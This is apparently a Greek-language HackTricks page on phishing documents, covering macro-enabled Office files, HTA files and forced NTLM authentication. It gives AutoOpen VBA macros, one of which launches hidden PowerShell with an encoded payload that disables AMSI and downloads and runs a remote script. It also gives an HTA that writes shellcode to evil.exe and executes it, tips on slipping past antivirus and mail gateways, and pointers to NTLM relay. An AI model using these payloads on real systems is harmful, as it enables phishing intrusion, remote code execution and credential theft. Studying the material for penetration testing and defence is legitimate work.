# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Το Microsoft Word εκτελεί έλεγχο εγκυρότητας δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Ο έλεγχος εγκυρότητας δεδομένων εκτελείται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν μακροεντολές χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατόν να μετονομάσετε το αρχείο αλλάζοντας την επέκταση του αρχείου και να διατηρήσετε τις δυνατότητες εκτέλεσης μακροεντολών.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει μακροεντολές, εκ του σχεδιασμού, αλλά ένα αρχείο DOCM που μετονομάζεται σε RTF θα διαχειρίζεται από το Microsoft Word και θα είναι ικανό για εκτέλεση μακροεντολών.\
Οι ίδιες εσωτερικές διαδικασίες και μηχανισμοί ισχύουν για όλα τα λογισμικά της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX αρχεία που αναφέρονται σε ένα απομακρυσμένο πρότυπο (Αρχείο – Επιλογές – Προσθήκες – Διαχείριση: Πρότυπα – Μετάβαση) που περιλαμβάνει μακροεντολές μπορούν επίσης να “εκτελούν” μακροεντολές.

### Φόρτωση Εξωτερικής Εικόνας

Μεταβείτε: _Εισαγωγή --> Γρήγορα Μέρη --> Πεδίο_\
&#xNAN;_**Κατηγορίες**: Σύνδεσμοι και Αναφορές, **Ονόματα πεδίων**: includePicture, και **Όνομα αρχείου ή URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Μακροεντολές Πίσω Πόρτα

Είναι δυνατόν να χρησιμοποιηθούν μακροεντολές για να εκτελούν αυθαίρετο κώδικα από το έγγραφο.

#### Λειτουργίες Αυτοφόρτωσης

Όσο πιο κοινές είναι, τόσο πιο πιθανό είναι να τις ανιχνεύσει το AV.

- AutoOpen()
- Document_Open()

#### Παραδείγματα Κώδικα Μακροεντολών
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Χειροκίνητη αφαίρεση μεταδεδομένων

Πηγαίνετε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει τον Εξεταστή Εγγράφων. Κάντε κλικ στο **Inspect** και στη συνέχεια στο **Remove All** δίπλα από **Document Properties and Personal Information**.

#### Επέκταση Εγγράφου

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε το αυτό γιατί **δεν μπορείτε να αποθηκεύσετε μακροεντολές μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** **γύρω** από την επέκταση με δυνατότητα μακροεντολών **`.docm`** (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες ιστού/ηλεκτρονικού ταχυδρομείου τις αποκλείουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι η καλύτερη συμβιβαστική λύση**.

#### Κατασκευαστές Κακόβουλων Μακροεντολών

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως "πλήρως αξιόπιστη" εφαρμογή, χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός προγράμματος περιήγησης.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως είναι **εγκατεστημένο** μαζί με **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από το IE**. Έτσι, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελούνται.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Αυθεντικοποίησης

Υπάρχουν αρκετοί τρόποι για να **εξαναγκάσετε την NTLM αυθεντικοποίηση "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που θα έχει πρόσβαση ο χρήστης (ακόμα και HTTP MitM;). Ή να στείλετε το θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσουν** μια **αυθεντικοποίηση** μόνο και μόνο για **άνοιγμα του φακέλου.**

**Ελέγξτε αυτές τις ιδέες και περισσότερες στις επόμενες σελίδες:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την αυθεντικοποίηση αλλά και να **εκτελέσετε επιθέσεις NTLM relay**:

- [**Επιθέσεις NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay σε πιστοποιητικά)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
